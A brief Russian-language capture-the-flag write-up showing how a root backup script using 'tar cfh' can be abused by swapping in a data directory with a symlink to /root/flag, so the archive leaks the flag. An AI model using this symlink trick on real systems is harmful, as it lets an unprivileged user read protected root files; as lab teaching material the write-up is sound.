Находим скрипт /opt/backup.sh
```
#!/bin/bash
tar cfh /tmp/backup.tar /home/user/data
```
Прав на opt,backup.sh и /home/user/data изменения/удаление/создания нет, но мы можем удалить и создать новую директорию data, в которой создадим символическую ссылку на /root/flag
```
ln -s /root/flag /home/user/data/flag.txt
```
Проверим /tmp/backup.tar и получим флаг